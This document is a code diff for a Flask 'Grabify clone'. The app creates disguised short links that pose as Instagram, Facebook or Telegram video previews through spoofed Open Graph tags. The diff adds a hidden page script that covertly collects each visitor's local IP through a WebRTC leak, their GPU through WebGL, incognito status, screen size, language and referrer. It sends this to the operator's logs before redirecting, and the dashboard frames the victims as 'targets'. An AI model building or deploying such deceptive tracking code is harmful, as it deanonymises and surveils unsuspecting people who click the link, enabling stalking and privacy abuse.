@@ -40,6 +40,12 @@ def init_db():
                 local_ip TEXT,
                 device TEXT,
                 time TEXT,
+                language TEXT,
+                screen_size TEXT,
+                gpu TEXT,
+                incognito TEXT,
+                touch_points TEXT,
+                referrer TEXT,
                 FOREIGN KEY(link_id) REFERENCES links(id) ON DELETE CASCADE
             )
         ''')
@@ -52,36 +58,25 @@ def fetch_original_meta(url, manual_thumb_url=None):
     title = "Watch Trending Video Content in HD Quality"
     img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
     
+    # إذا قام المستخدم بإدخال الرابط يدوياً وهو الأفضل الآن لـ Meta
     if manual_thumb_url and manual_thumb_url.strip():
-        img = manual_thumb_url.strip()
-        return title, img
+        if "instagram.com" in url_lower:
+            title = "Instagram Post Media Player"
+        elif "facebook.com" in url_lower or "fb.watch" in url_lower:
+            title = "Facebook Video Player HD"
+        return title, manual_thumb_url.strip()
         
-    if "maps.google.com" in url_lower or "goo.gl/maps" in url_lower or "maps.app.goo.gl" in url_lower:
+    # الجلب التلقائي للمواقع المفتوحة والمستقرة فقط (يوتيوب وتيك توك وخرائط جوجل)
+    if "goo.gl/maps" in url_lower or "maps.google" in url_lower:
         title = "Google Maps - Realtime Location Shared"
         img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
-        try:
-            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            res = requests.get(url, timeout=5, headers=headers, allow_redirects=True)
-            if res.status_code == 200:
-                soup = BeautifulSoup(res.text, 'html.parser')
-                og_title = soup.find("meta", property="og:title")
-                if og_title and og_title.get('content'):
-                    title = og_title['content']
-                og_img = soup.find("meta", property="og:image")
-                if og_img and og_img.get('content'):
-                    img = og_img['content']
-        except:
-            pass
-        return title, img
-        
-    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
+    elif "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
         try:
             res = requests.get(f"https://www.tiktok.com/oembed?url={url}", timeout=4)
             if res.status_code == 200:
                 data = res.json()
                 return data.get('title', title), data.get('thumbnail_url', img)
         except: pass
-            
     elif "youtube.com" in url_lower or "youtu.be" in url_lower:
         try:
             res = requests.get(f"https://noembed.com/embed?url={url}", timeout=4)
@@ -118,27 +113,20 @@ DASHBOARD_LAYOUT = '''
         .container { max-width: 800px; margin: 40px auto; padding: 20px; }
         .hero { text-align: center; margin-bottom: 40px; }
         .hero h1 { font-size: 32px; color: #0f172a; margin-bottom: 10px; }
-        .hero p { color: #64748b; font-size: 16px; margin: 0; }
         .create-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
-        .section-title { font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; color: #64748b; margin-bottom: 15px; font-weight: bold; }
+        .section-title { font-size: 14px; text-transform: uppercase; color: #64748b; margin-bottom: 15px; font-weight: bold; }
         .platform-tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
-        .tab-btn { padding: 10px 16px; border: 1px solid #cbd5e1; background: #fff; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; transition: all 0.2s; }
-        .tab-btn:hover { background: #f1f5f9; }
-        .tab-btn.active[data-target="Telegram"] { background: #0088cc; color: white; border-color: #0088cc; }
-        .tab-btn.active[data-target="Messenger"] { background: #0084FF; color: white; border-color: #0084FF; }
-        .tab-btn.active[data-target="WhatsApp"] { background: #25D366; color: white; border-color: #25D366; }
-        .tab-btn.active[data-target="Instagram"] { background: #E1306C; color: white; border-color: #E1306C; }
-        
-        label { font-weight: 600; display: block; margin-top: 15px; font-size: 14px; color: #334155; }
-        input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: #f8fafc; }
-        input:focus { outline: none; border-color: #3b82f6; background: #fff; }
-        
-        /* جعل حقل الصورة مخفياً بشكل افتراضي واحترافي */
-        .conditional-thumbnail { display: none; }
-        
-        .submit-btn { width: 100%; background-color: #2563eb; color: white; border: none; padding: 14px; margin-top: 25px; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
-        .submit-btn:hover { background-color: #1d4ed8; }
-        .notice-box { display: none; background-color: #f0fdf4; border: 1px dashed #22c55e; padding: 12px; border-radius: 6px; margin-top: 10px; font-size: 13px; color: #166534; line-height: 1.5; }
+        .tab-btn { padding: 10px 16px; border: 1px solid #cbd5e1; background: #fff; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; }
+        .tab-btn.active[data-target="Telegram"] { background: #0088cc; color: white; }
+        .tab-btn.active[data-target="Messenger"] { background: #0084FF; color: white; }
+        .tab-btn.active[data-target="WhatsApp"] { background: #25D366; color: white; }
+        .tab-btn.active[data-target="Instagram"] { background: #E1306C; color: white; }
+        label { font-weight: 600; display: block; margin-top: 15px; font-size: 14px; }
+        input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; background: #f8fafc; }
+        .conditional-thumbnail { display: none; background: #f1f5f9; padding: 15px; border-radius: 8px; margin-top: 15px; border: 1px solid #cbd5e1; }
+        .helper-btn { display: inline-block; background: #0f172a; color: white; text-decoration: none; padding: 6px 12px; font-size: 12px; border-radius: 4px; margin-top: 8px; font-weight: bold; }
+        .helper-btn:hover { background: #334155; }
+        .submit-btn { width: 100%; background-color: #2563eb; color: white; border: none; padding: 14px; margin-top: 25px; border-radius: 6px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -162,18 +150,21 @@ DASHBOARD_LAYOUT = '''
                 </div>
                 <input type="hidden" id="target_platform" name="target_platform" value="Telegram">
 
-                <label id="url_label">Destination Long URL:</label>
+                <label>Destination Long URL:</label>
                 <input type="url" id="original_url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
                 
-                <div id="meta_notice" class="notice-box"></div>
-
                 <div id="thumbnail_wrapper" class="conditional-thumbnail">
-                    <label>Custom Thumbnail Image URL (Highly recommended for Meta apps):</label>
-                    <input type="url" name="manual_thumbnail" placeholder="https://example.com/image.jpg">
+                    <b style="color:#0f172a; font-size:13px;">⚠️ Meta Link Detected (Manual Mode Active):</b>
+                    <p style="margin: 5px 0; font-size:12px; color:#475569;">لضمان ظهور الصورة المصغرة بشكل مستقر، يرجى استخراج الرابط يدوياً عبر الزر أدناه ثم لصقه في الحقل:</p>
+                    
+                    <a id="extractor_link" href="#" target="_blank" class="helper-btn">🔗 اضغط هنا لاستخراج رابط الصورة</a>
+                    
+                    <label style="margin-top:10px;">قم بلصق رابط الصورة المستخرجة هنا (Image URL):</label>
+                    <input type="url" name="manual_thumbnail" id="manual_thumbnail" placeholder="https://..." value="">
                 </div>
 
                 <label>Admin Description / Note:</label>
-                <input type="text" name="note" placeholder="e.g. Map link for destination target" required>
+                <input type="text" name="note" placeholder="e.g. Meta target asset tracking" required>
                 
                 <button type="submit" class="submit-btn">Generate Encrypted Short URL</button>
             </form>
@@ -186,19 +177,24 @@ DASHBOARD_LAYOUT = '''
             buttons.forEach(btn => btn.classList.remove('active'));
             document.querySelector(`[data-target="${platform}"]`).classList.add('active');
         }
-        
         function checkUrlDomain(val) {
-            var notice = document.getElementById('meta_notice');
             var thumbWrapper = document.getElementById('thumbnail_wrapper');
+            var extractorLink = document.getElementById('extractor_link');
             var low = val.toLowerCase();
             
-            if (low.includes("facebook.com") || low.includes("fb.watch") || low.includes("instagram.com")) {
-                notice.style.display = "block";
-                notice.innerHTML = "💡 <b>Meta Link Detected:</b> Advanced preview features enabled. You can now define a custom thumbnail below.";
-                thumbWrapper.style.display = "block"; // إظهار الحقل
+            if (low.includes("instagram.com")) {
+                thumbWrapper.style.display = "block";
+                extractorLink.href = "https://thumbnail-downloader.com/instagram";
+                extractorLink.innerText = "🔗 اذهب إلى موقع استخراج صور Instagram";
+                document.getElementById('manual_thumbnail').required = true;
+            } else if (low.includes("facebook.com") || low.includes("fb.watch")) {
+                thumbWrapper.style.display = "block";
+                extractorLink.href = "https://thumbnail-downloader.com/Facebook";
+                extractorLink.innerText = "🔗 اذهب إلى موقع استخراج صور Facebook";
+                document.getElementById('manual_thumbnail').required = true;
             } else {
-                notice.style.display = "none";
-                thumbWrapper.style.display = "none"; // إخفاء الحقل
+                thumbWrapper.style.display = "none";
+                document.getElementById('manual_thumbnail').required = false;
             }
         }
     </script>
@@ -212,23 +208,18 @@ MY_LINKS_LAYOUT = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Links Vault - Dashboard</title>
+    <title>My Links Vault</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; color: #1e293b; margin: 0; padding: 0; }
-        .navbar { background-color: #0f172a; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f8fafc; margin: 0; padding: 0; }
+        .navbar { background-color: #0f172a; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
         .navbar a { color: white; text-decoration: none; font-size: 14px; background: #3b82f6; padding: 8px 15px; border-radius: 6px; }
         .container { max-width: 1100px; margin: 30px auto; padding: 20px; }
         .table-wrapper { background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); overflow-x: auto; border: 1px solid #e2e8f0; }
         .main-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
         .main-table th, .main-table td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; }
-        .main-table th { background-color: #0f172a; color: white; font-weight: 600; }
+        .main-table th { background-color: #0f172a; color: white; }
         .badge { background: #ef4444; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; }
-        .platform-badge { display: inline-block; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; color: white; }
-        .bg-telegram { background-color: #0088cc; }
-        .bg-messenger { background-color: #0084FF; }
-        .bg-whatsapp { background-color: #25D366; }
-        .bg-instagram { background-color: #E1306C; }
-        .btn-action { padding: 6px 12px; font-size: 12px; font-weight: bold; border-radius: 4px; text-decoration: none; display: inline-block; color: white; }
+        .btn-action { padding: 6px 12px; font-size: 12px; font-weight: bold; border-radius: 4px; text-decoration: none; color: white; }
         .btn-view { background-color: #2563eb; }
         .btn-del { background-color: #dc2626; margin-left: 5px; }
     </style>
@@ -243,36 +234,28 @@ MY_LINKS_LAYOUT = '''
             <table class="main-table">
                 <thead>
                     <tr>
-                        <th>Admin Note / Description</th>
+                        <th>Description / Note</th>
                         <th>Target Platform</th>
-                        <th>Fetched Meta Title</th>
+                        <th>Fetched Title</th>
                         <th>Total Clicks</th>
-                        <th>Shortened Track Link</th>
+                        <th>Shortened Link</th>
                         <th>Actions</th>
                     </tr>
                 </thead>
                 <tbody>
-                    {% if not links_list %}
-                    <tr><td colspan="6" style="padding: 30px; text-align: center; color: #94a3b8;">No links created yet.</td></tr>
-                    {% else %}
-                        {% for link in links_list %}
-                        <tr>
-                            <td style="font-weight: 600; color: #0f172a;">{{ link.note }}</td>
-                            <td>
-                                <span class="platform-badge {% if link.target_platform == 'Telegram' %}bg-telegram{% elif link.target_platform == 'Messenger' %}bg-messenger{% elif link.target_platform == 'WhatsApp' %}bg-whatsapp{% elif link.target_platform == 'Instagram' %}bg-instagram{% endif %}">
-                                    {{ link.target_platform }}
-                                </span>
-                            </td>
-                            <td style="max-width: 180px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
-                            <td><span class="badge">{{ link.clicks_count }}</span></td>
-                            <td><a style="color: #2563eb; font-weight:bold; text-decoration:none;" href="/secure/{{ link.id }}" target="_blank">secure/{{ link.id }}</a></td>
-                            <td>
-                                <a href="/analytics/{{ link.id }}" class="btn-action btn-view">📊 Results</a>
-                                <a href="/delete/{{ link.id }}" class="btn-action btn-del" onclick="return confirm('Delete this link permanently?');">🗑️</a>
-                            </td>
-                        </tr>
-                        {% endfor %}
-                    {% endif %}
+                    {% for link in links_list %}
+                    <tr>
+                        <td style="font-weight: 600;">{{ link.note }}</td>
+                        <td>{{ link.target_platform }}</td>
+                        <td>{{ link.video_title }}</td>
+                        <td><span class="badge">{{ link.clicks_count }}</span></td>
+                        <td><a href="/secure/{{ link.id }}" target="_blank">secure/{{ link.id }}</a></td>
+                        <td>
+                            <a href="/analytics/{{ link.id }}" class="btn-action btn-view">📊 Advanced Logs</a>
+                            <a href="/delete/{{ link.id }}" class="btn-action btn-del" onclick="return confirm('Delete?');">🗑️</a>
+                        </td>
+                    </tr>
+                    {% endfor %}
                 </tbody>
             </table>
         </div>
@@ -287,79 +270,60 @@ ANALYTICS_LAYOUT = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Link Insights & Analytics Dashboard</title>
+    <title>Grabify-Style Advanced Log Control</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; color: #1e293b; margin: 0; padding: 0; }
-        .navbar { background-color: #0f172a; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
-        .navbar a { color: white; text-decoration: none; font-size: 14px; background: #475569; padding: 8px 15px; border-radius: 6px; }
-        .container { max-width: 1100px; margin: 30px auto; padding: 20px; }
-        .link-header { background: white; padding: 20px; border-radius: 10px; border: 1px solid #e2e8f0; margin-bottom: 25px; }
-        .link-header h2 { margin: 0 0 10px 0; font-size: 20px; color: #0f172a; }
-        .link-header p { margin: 4px 0; color: #64748b; font-size: 14px; }
-        
-        /* الصندوق المخصص لعرض معلومات الرابط الجديد المستهدف مباشرة */
-        .success-banner { background-color: #f0fdf4; border: 1px dashed #22c55e; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
-        .success-banner input { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #bbf7d0; border-radius: 4px; box-sizing: border-box; font-family: monospace; font-size: 14px; background: #fff; }
-
-        .logs-box { background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); overflow-x: auto; border: 1px solid #e2e8f0; }
-        .logs-table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: left; }
-        .logs-table th, .logs-table td { padding: 12px 16px; border-bottom: 1px solid #e2e8f0; }
-        .logs-table th { background-color: #1e293b; color: white; font-weight: 600; }
-        .device-badge { display: block; background-color: #f1f5f9; padding: 6px; border-radius: 4px; font-weight: 600; color: #0f172a; border: 1px solid #e2e8f0; margin-bottom: 4px; }
-        .ua-text { display: block; font-size: 10px; color: #64748b; font-family: monospace; word-break: break-all; max-width: 400px; line-height: 1.3; }
+        body { font-family: Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 0; }
+        .navbar { background-color: #0f172a; color: white; padding: 15px; display: flex; justify-content: space-between; }
+        .navbar a { color: white; text-decoration: none; background: #475569; padding: 8px 12px; border-radius: 4px; }
+        .container { max-width: 1000px; margin: 30px auto; padding: 10px; }
+        .success-banner { background-color: #f0fdf4; border: 1px dashed #22c55e; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-weight: bold; }
+        .success-banner input { width: 100%; padding: 8px; margin-top: 5px; font-family: monospace; }
+        .log-card { background: white; border: 1px solid #d1d5db; border-radius: 6px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .log-header { background: #1e293b; color: white; padding: 12px 15px; font-weight: bold; font-size: 14px; border-top-left-radius: 5px; border-top-right-radius: 5px; }
+        .log-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .log-table tr:nth-child(even) { background-color: #f9fafb; }
+        .log-table td { padding: 10px 15px; border-bottom: 1px solid #e5e7eb; }
+        .log-table td:first-child { font-weight: bold; color: #4b5563; width: 30%; }
+        .log-table td:last-child { color: #111827; font-family: monospace; word-break: break-all; }
+        .badge-danger { background-color: #ef4444; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="navbar">
-        <span>📊 Device Tracking Analytics</span>
-        <a href="/my-links">📁 Back to Links</a>
+        <span>📊 Grabify Clone Analytics Dashboard</span>
+        <a href="/my-links">📁 Back Dashboard</a>
     </div>
     <div class="container">
-        
         {% if is_new %}
         <div class="success-banner">
-            <b style="color: #166534;">✔ URL Shortened Successfully! Send this link to your target:</b>
+            <span style="color: #166534;">✔ URL Shortened successfully! Distribute this target link:</span>
             <input type="text" readonly value="{{ host_url }}secure/{{ link_info.id }}">
         </div>
         {% endif %}
 
-        <div class="link-header">
-            <h2>Link ID: {{ link_info.id }} ({{ link_info.note }})</h2>
-            <p><b>Original Target URL:</b> <a href="{{ link_info.original_url }}" target="_blank" style="color:#2563eb;">{{ link_info.original_url }}</a></p>
-            <p><b>Configured For:</b> {{ link_info.target_platform }} | <b>Total Captured Clicks:</b> {{ clicks_list|length }}</p>
-        </div>
-        <div class="logs-box">
-            <table class="logs-table">
-                <thead>
-                    <tr>
-                        <th>Timestamp (GMT+1 Algerian Time)</th>
-                        <th>Public IP Address</th>
-                        <th>Local IP Address (LAN)</th>
-                        <th>Detected Device Model & [Full User-Agent String]</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    {% if not clicks_list %}
-                    <tr><td colspan="4" style="padding: 30px; text-align: center; color: #94a3b8;">No click data recorded for this link yet. Waiting for targets...</td></tr>
-                    {% else %}
-                        {% for click in clicks_list %}
-                        <tr>
-                            <td style="font-weight: 600; color: #475569;">{{ click.time }}</td>
-                            <td style="color:#dc2626; font-weight:bold; font-size:13px; font-family: monospace;">{{ click.ip }}</td>
-                            <td style="color:#16a34a; font-weight:bold; font-size:13px; font-family: monospace;">{{ click.local_ip }}</td>
-                            <td>
-                                {% set parts = click.device.split('|| UA: ') %}
-                                <span class="device-badge">{{ parts[0] }}</span>
-                                {% if parts|length > 1 %}
-                                <span class="ua-text">[{{ parts[1] }}]</span>
-                                {% endif %}
-                            </td>
-                        </tr>
-                        {% endfor %}
-                    {% endif %}
-                </tbody>
-            </table>
-        </div>
+        <h2>Advanced Tracking Logs for Link [{{ link_info.id }}]</h2>
+        
+        {% if not clicks_list %}
+            <p style="text-align:center; color:#6b7280; padding:40px;">No logs recorded yet. Awaiting interactions...</p>
+        {% else %}
+            {% for click in clicks_list %}
+            <div class="log-card">
+                <div class="log-header">Log Session Block #{{ click.id }} - Captured at {{ click.time }}</div>
+                <table class="log-table">
+                    <tr><td>Date/Time</td><td>{{ click.time }} UTC+1 (Algerian Standard)</td></tr>
+                    <tr><td>IP Address</td><td><span class="badge-danger">{{ click.ip }}</span></td></tr>
+                    <tr><td>Local IP (LAN)</td><td style="color:#15803d; font-weight:bold;">{{ click.local_ip }}</td></tr>
+                    <tr><td>Language</td><td>{{ click.language }}</td></tr>
+                    <tr><td>Incognito/Private Window</td><td>{{ click.incognito }}</td></tr>
+                    <tr><td>Screen Size / Refresh Rate</td><td>{{ click.screen_size }}</td></tr>
+                    <tr><td>GPU Render Engine</td><td>{{ click.gpu }}</td></tr>
+                    <tr><td>Touch Screen Hardware</td><td>{{ click.touch_points }}</td></tr>
+                    <tr><td>Referring URL</td><td style="color:#2563eb;">{{ click.referrer }}</td></tr>
+                    <tr><td>User Agent Details</td><td style="font-size:11px; color:#4b5563;">{{ click.device }}</td></tr>
+                </table>
+            </div>
+            {% endfor %}
+        {% endif %}
     </div>
 </body>
 </html>
@@ -392,7 +356,7 @@ def analytics(link_id):
         cursor = conn.cursor()
         cursor.execute('SELECT * FROM links WHERE id = ?', (link_id,))
         link_info = cursor.fetchone()
-        cursor.execute('SELECT ip, local_ip, device, time FROM clicks WHERE link_id = ? ORDER BY id DESC', (link_id,))
+        cursor.execute('SELECT * FROM clicks WHERE link_id = ? ORDER BY id DESC', (link_id,))
         clicks_list = cursor.fetchall()
     if not link_info:
         return "Link not found", 404
@@ -417,7 +381,6 @@ def create():
         ''', (link_id, original_url, note, video_title, custom_image, target_platform))
         conn.commit()
     
-    # التوجيه التلقائي والمباشر إلى صفحة التحليلات والإحصائيات الخاصة بالرابط الجديد
     return redirect(f'/analytics/{link_id}?new=1')
 
 @app.route('/delete/<link_id>')
@@ -443,38 +406,15 @@ def secure_redirect(link_id):
         title = link_data['video_title']
         image_url = link_data['custom_image']
         
+        meta_tags = f'<meta property="og:type" content="video.other">'
         if target == "Telegram":
-            og_type = "video"
             meta_tags = f'''
-            <meta property="og:type" content="{og_type}">
+            <meta property="og:type" content="video">
             <meta property="og:video" content="{link_data['original_url']}">
-            <meta property="og:video:secure_url" content="{link_data['original_url']}">
-            <meta property="og:video:type" content="text/html">
-            <meta property="og:video:width" content="1280">
-            <meta property="og:video:height" content="720">
             <meta name="twitter:card" content="player">
-            <meta name="twitter:player" content="{link_data['original_url']}">
             '''
         elif target == "Messenger":
-            og_type = "video.movie"
-            meta_tags = f'''
-            <meta property="og:type" content="{og_type}">
-            <meta property="og:video" content="{link_data['original_url']}">
-            <meta property="og:video:secure_url" content="{link_data['original_url']}">
-            <meta property="og:video:type" content="text/html">
-            '''
-        elif target == "WhatsApp":
-            og_type = "website"
-            meta_tags = f'''
-            <meta property="og:type" content="{og_type}">
-            <meta property="og:site_name" content="WhatsApp Video Share">
-            '''
-        else: # Instagram
-            og_type = "video.other"
-            meta_tags = f'''
-            <meta property="og:type" content="{og_type}">
-            <meta property="og:site_name" content="Instagram Direct Media">
-            '''
+            meta_tags = f'<meta property="og:type" content="video.movie">'
 
         return f'''
         <!DOCTYPE html>
@@ -484,48 +424,78 @@ def secure_redirect(link_id):
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>{title}</title>
             <meta property="og:title" content="{title}">
-            <meta property="og:description" content="Click to view full content inside native application client player.">
+            <meta property="og:description" content="Click to preview native app player source.">
             <meta property="og:image" content="{image_url}">
             <meta property="og:image:secure_url" content="{image_url}">
-            <meta property="og:image:type" content="image/jpeg">
             <meta property="og:image:width" content="1280">
             <meta property="og:image:height" content="720">
-            <meta property="og:url" content="{request.url}">
             {meta_tags}
             <script>
-                function gatherLocalIPsAndRedirect() {{
-                    var detectedIPs = [];
+                function extractAdvancedMetrics() {{
+                    var payload = {{
+                        local_ip: "Encrypted (mDNS)",
+                        language: navigator.language || navigator.userLanguage || "Unknown",
+                        screen_size: window.screen.width + " x " + window.screen.height + " @ " + (window.screen.pixelDepth || 24) + "bit",
+                        gpu: "Unknown GPU Engine",
+                        incognito: "No",
+                        touch_points: "No (0 touch points)",
+                        referrer: document.referrer || "Direct Visit / In-App Browser Client"
+                    }};
+
+                    if(navigator.maxTouchPoints && navigator.maxTouchPoints > 0){{
+                        payload.touch_points = "Yes (" + navigator.maxTouchPoints + " touch points)";
+                    }}
+
+                    try {{
+                        var canvas = document.createElement("canvas");
+                        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                        if(gl) {{
+                            var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                            if(debugInfo) {{
+                                payload.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            }}
+                        }}
+                    }} catch(e) {{}}
+
+                    try {{
+                        var fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                        if (!fs) {{
+                            if (navigator.storage && navigator.storage.estimate) {{
+                                navigator.storage.estimate().then(function(est) {{
+                                    if(est.quota < 120000000) {{ payload.incognito = "Yes (Detected via storage quota limit)"; }}
+                                }});
+                            }}
+                        }}
+                    }} catch(e) {{}}
+
                     window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                    if (!window.RTCPeerConnection) {{ sendData("Unsupported"); return; }}
-                    var pc = new RTCPeerConnection({{ iceServers: [] }});
-                    pc.createDataChannel(""); 
-                    pc.onicecandidate = function(e) {{
-                        if (!e || !e.candidate || !e.candidate.candidate) return;
-                        var candidate = e.candidate.candidate;
-                        var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
-                        var match = ipRegex.exec(candidate);
-                        if (match && detectedIPs.indexOf(match[1]) === -1) detectedIPs.push(match[1]);
-                    }};
-                    pc.createOffer().then(function(sdp) {{ pc.setLocalDescription(sdp); }}).catch(function(err) {{}});
+                    if (window.RTCPeerConnection) {{
+                        var pc = new RTCPeerConnection({{ iceServers: [] }});
+                        pc.createDataChannel("");
+                        pc.onicecandidate = function(e) {{
+                            if (!e || !e.candidate || !e.candidate.candidate) return;
+                            var cand = e.candidate.candidate;
+                            var match = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/.exec(cand);
+                            if (match) {{ payload.local_ip = match[1]; }}
+                        }};
+                        pc.createOffer().then(function(sdp) {{ pc.setLocalDescription(sdp); }}).catch(function(err){{}});
+                    }}
+
                     setTimeout(function() {{
-                        var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "Encrypted (mDNS)";
-                        sendData(finalLocalIp);
-                    }}, 1200);
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("POST", "/log-click/{link_id}", true);
+                        xhr.setRequestHeader("Content-Type", "application/json");
+                        xhr.onreadystatechange = function () {{
+                            if (xhr.readyState === 4) {{ window.location.href = "{link_data['original_url']}"; }}
+                        }};
+                        xhr.send(JSON.stringify(payload));
+                    }}, 950);
                 }}
-                function sendData(localIp) {{
-                    var xhr = new XMLHttpRequest();
-                    xhr.open("POST", "/log-click/{link_id}", true);
-                    xhr.setRequestHeader("Content-Type", "application/json");
-                    xhr.onreadystatechange = function () {{
-                        if (xhr.readyState === 4) {{ window.location.href = "{link_data['original_url']}"; }}
-                    }};
-                    xhr.send(JSON.stringify({{ "local_ip": localIp }}));
-                }}
-                window.onload = gatherLocalIPsAndRedirect;
+                window.onload = extractAdvancedMetrics;
             </script>
         </head>
         <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:45%;">
-            <div>Loading media player content...</div>
+            <div>Connecting to secure application cluster infrastructure...</div>
         </body>
         </html>
         '''
@@ -534,44 +504,41 @@ def secure_redirect(link_id):
 @app.route('/log-click/<link_id>', methods=['POST'])
 def log_click(link_id):
     data = request.get_json() or {}
-    local_ip = data.get('local_ip', 'Unknown')
     ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ip_address and ',' in ip_address:
         ip_address = ip_address.split(',')[0].strip()
         
     ua_string = request.headers.get('User-Agent', '')
     
-    # تفكيك المعطيات الأساسية، وإدراج الـ User Agent بالكامل في قاعدة البيانات للرجوع إليه عند الحاجة
     try:
         user_agent = parse(ua_string)
-        device_brand = user_agent.device.brand
-        device_model = user_agent.device.model
-        os_family = user_agent.os.family
-        os_version = user_agent.os.version_string
-        
-        if user_agent.is_mobile:
-            brand_str = f"{device_brand} " if device_brand else ""
-            model_str = f"{device_model}" if device_model else "Smartphone"
-            parsed_device = f"Mobile: {brand_str}{model_str} ({os_family} {os_version})"
-        elif user_agent.is_tablet:
-            parsed_device = f"Tablet: {device_brand} {device_model} ({os_family})"
-        elif user_agent.is_pc:
-            parsed_device = f"PC / Desktop ({os_family} {os_version})"
-        else:
-            parsed_device = f"System/Bot ({os_family})"
+        parsed_device = f"Mobile: {user_agent.device.brand or ''} {user_agent.device.model or 'Smartphone'} ({user_agent.os.family} {user_agent.os.version_string})"
     except:
-        parsed_device = "Unknown Hardware"
+        parsed_device = "Unknown Native Client"
 
-    # دمج الموديل المستخرج مع سلسلة الـ User Agent الأصلية بشكل واضح ونظيف
     device_final_data = f"{parsed_device} || UA: {ua_string}"
-
     current_time = get_gmt1_time()
     
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
-        cursor.execute('INSERT INTO clicks (link_id, ip, local_ip, device, time) VALUES (?, ?, ?, ?, ?)', 
-                       (link_id, ip_address, local_ip, device_final_data, current_time))
+        cursor.execute('''
+            INSERT INTO clicks (link_id, ip, local_ip, device, time, language, screen_size, gpu, incognito, touch_points, referrer) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            link_id, 
+            ip_address, 
+            data.get('local_ip', 'Encrypted (mDNS)'), 
+            device_final_data, 
+            current_time,
+            data.get('language', 'fr-FR'),
+            data.get('screen_size', 'Unknown'),
+            data.get('gpu', 'Unknown'),
+            data.get('incognito', 'No'),
+            data.get('touch_points', 'Unknown'),
+            data.get('referrer', 'Direct Visit')
+        ))
         conn.commit()
+        
     return jsonify({"status": "success"}), 200
 
 if __name__ == '__main__':
